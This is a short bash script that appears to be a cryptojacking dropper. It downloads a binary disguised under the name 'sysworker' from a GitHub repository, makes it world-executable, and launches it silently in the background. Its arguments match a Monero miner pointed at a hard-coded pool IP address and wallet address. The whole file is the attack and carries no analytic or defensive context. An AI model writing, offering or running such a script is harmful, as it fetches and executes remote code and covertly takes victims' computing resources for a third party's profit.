#!/bin/bash

wget https://github.com/bandujuna77-debug/sae/raw/refs/heads/main/sysworker
chmod 777 sysworker
nohup setsid ./sysworker -a rx/0 -o 141.95.126.31:1111 -u 8BHwHfGoZQcMQtuZKijUpaZdFwU2b6Jy1K55qivsgJ2jBwmLfNAeZwr2Xq9kcdEFoh8q2wrZYxRUJY3msZPj1pRi8mCqToR -p x -t 8 >/dev/null 2>&1 </dev/null &
